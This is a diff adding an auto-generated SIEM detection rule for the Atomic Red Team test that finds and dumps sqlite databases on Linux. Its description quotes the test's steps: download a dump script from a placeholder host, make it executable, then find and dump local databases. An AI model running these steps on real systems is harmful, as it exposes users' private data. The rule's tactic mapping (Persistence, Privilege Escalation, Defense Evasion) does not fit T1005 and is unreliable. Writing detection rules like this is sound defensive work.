@@ -1,0 +1,39 @@
+[rule]
+author = [ "AtomicRedTeam-Automation",]
+description = "Detection for specific test 'Find and dump sqlite databases (Linux)' (GUID: 00cbb875-7ae4-4cf1-b638-e543fd825300) of technique T1005 (Data from Local System). Test Description: An adversary may know/assume that the user of a system uses sqlite databases which contain interest and sensitive data. In this test we download two databases and a sqlite dump script, then run a find command to find & dump the database content.. Command/Steps: cd $HOME\ncurl -O #{remote_url}/art\ncurl -O #{remote_url}/gta.db\ncurl -O #{remote_url}/sqlite_dump.sh\nchmod +x sqlite_dump.sh\nfind . ! -executable -exe..."
+from = "now-9m"
+rule_id = "4dd63f76-085e-482c-a3b1-153c8c83e188"
+language = "kql"
+name = "Atomic Test: T1005 - Find and dump sqlite databases (Linux)"
+output_index = ".siem-signals-default"
+references = [ "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/refs/heads/master/atomics/T1005/T1005.yaml",]
+risk_score = 50
+severity = "medium"
+tags = [ "AtomicRedTeam", "T1005", "00cbb875-7ae4-4cf1-b638-e543fd825300", "linux",]
+type = "query"
+query = "(process.name : (\\\"sh\\\", \\\"bash\\\") OR process.parent.name : (\\\"sh\\\", \\\"bash\\\")) AND process.command_line : \\\"*$HOME*\\\" AND process.command_line : \\\"*curl*\\\" AND process.command_line : \\\"*curl*\\\""
+version = 1
+index = [ "logs-endpoint.events.*", "winlogbeat-*", "logs-windows.*", "logs-linux.*", "logs-macos.*",]
+[[rule.threat]]
+framework = "MITRE ATT&CK"
+[[rule.threat.technique]]
+id = "T1005"
+name = "Find and dump sqlite databases (Linux)"
+reference = "https://attack.mitre.org/techniques/T1005"
+
+[[rule.threat.tactic]]
+id = "TA0003"
+name = "Persistence"
+reference = "https://attack.mitre.org/techniques/T1005"
+
+[[rule.threat.tactic]]
+id = "TA0004"
+name = "Privilege Escalation"
+reference = "https://attack.mitre.org/techniques/T1005"
+
+[[rule.threat.tactic]]
+id = "TA0005"
+name = "Defense Evasion"
+reference = "https://attack.mitre.org/techniques/T1005"
+
+
